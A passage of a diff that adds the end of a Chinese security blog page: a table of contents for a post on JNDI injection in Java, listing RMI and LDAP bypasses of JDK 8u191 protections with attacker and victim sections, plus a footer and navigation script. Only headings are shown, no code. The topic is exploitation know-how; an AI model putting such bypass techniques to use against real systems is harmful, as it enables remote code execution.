+<li><a href="#javaxnamingspinamingmanagergetobjectfactoryfromreference-2"><code>javax.naming.spi.NamingManager#getObjectFactoryFromReference</code></a></li>
+</ul>
+</li>
+<li><a href="#%E8%B0%83%E7%94%A8%E6%A0%88-2">调用栈</a></li>
+<li><a href="#jdk8u191"><code>jdk8u191</code></a></li>
+</ul>
+</li>
+<li><a href="#jdk8u191%E4%BB%A5%E5%90%8E"><code>jdk8u191</code>以后</a>
+<ul>
+<li><a href="#8u191%E7%9A%84%E6%94%B9%E5%8F%98"><code>8u191</code>的改变</a></li>
+<li><a href="#rmi%E7%9A%84%E7%BB%95%E8%BF%87"><code>rmi</code>的绕过</a>
+<ul>
+<li><a href="#%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83-3">测试环境</a></li>
+<li><a href="#server%E6%94%BB%E5%87%BB%E8%80%85-3"><code>Server</code>（攻击者）</a></li>
+<li><a href="#client%E5%8F%97%E5%AE%B3%E8%80%85-3"><code>Client</code>（受害者）</a>
+<ul>
+<li><a href="#javaxnaminginitialcontextgeturlordefaultinitctx-3"><code>javax.naming.InitialContext#getURLOrDefaultInitCtx</code></a></li>
+<li><a href="#comsunjnditoolkiturlgenericurlcontextlookup-3"><code>com.sun.jndi.toolkit.url.GenericURLContext#lookup</code></a></li>
+<li><a href="#comsunjndirmiregistryregistrycontextlookup-2"><code>com.sun.jndi.rmi.registry.RegistryContext#lookup</code></a></li>
+<li><a href="#comsunjndirmiregistryregistrycontextdecodeobject-2"><code>com.sun.jndi.rmi.registry.RegistryContext#decodeObject</code></a></li>
+<li><a href="#javaxnamingspinamingmanagergetobjectinstance-2"><code>javax.naming.spi.NamingManager#getObjectInstance</code></a></li>
+<li><a href="#orgapachenamingfactorybeanfactorygetobjectinstance"><code>org.apache.naming.factory.BeanFactory#getObjectInstance</code></a></li>
+</ul>
+</li>
+<li><a href="#%E8%B0%83%E7%94%A8%E9%93%BE">调用链</a></li>
+</ul>
+</li>
+<li><a href="#ldap%E7%9A%84%E7%BB%95%E8%BF%87"><code>ldap</code>的绕过</a>
+<ul>
+<li><a href="#%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83-4">测试环境</a></li>
+<li><a href="#%E7%AE%80%E8%BF%B0">简述</a></li>
+<li><a href="#server%E6%94%BB%E5%87%BB%E8%80%85-4">Server（攻击者）</a></li>
+<li><a href="#client%E5%8F%97%E5%AE%B3%E8%80%85-4">Client(受害者)</a>
+<ul>
+<li><a href="#javaxnaminginitialcontextgeturlordefaultinitctx-4"><code>javax.naming.InitialContext#getURLOrDefaultInitCtx</code></a></li>
+<li><a href="#comsunjndiurlldapldapurlcontextlookup-2"><code>com.sun.jndi.url.ldap.ldapURLContext#lookup</code></a></li>
+<li><a href="#comsunjnditoolkiturlgenericurlcontextlookup-4"><code>com.sun.jndi.toolkit.url.GenericURLContext#lookup</code></a></li>
+<li><a href="#comsunjnditoolkitctxpartialcompositecontextlookup-2"><code>com.sun.jndi.toolkit.ctx.PartialCompositeContext#lookup</code></a></li>
+<li><a href="#comsunjnditoolkitctxcomponentcontextp_lookup-2"><code>com.sun.jndi.toolkit.ctx.ComponentContext#p_lookup</code></a></li>
+<li><a href="#comsunjndildapldapctxc_lookup-2"><code>com.sun.jndi.ldap.LdapCtx#c_lookup</code></a></li>
+<li><a href="#comsunjndildapobjdecodeobject"><code>com.sun.jndi.ldap.Obj#decodeObject</code></a></li>
+<li><a href="#comsunjndildapobjdeserializeobject"><code>com.sun.jndi.ldap.Obj#deserializeObject</code></a></li>
+</ul>
+</li>
+<li><a href="#%E8%B0%83%E7%94%A8%E9%93%BE-2">调用链</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#misc"><code>misc</code></a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+
+        
+
+        <div class="site-footer">
+  easy money sniper
+  <a class="rss" href="https://ret2hh.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
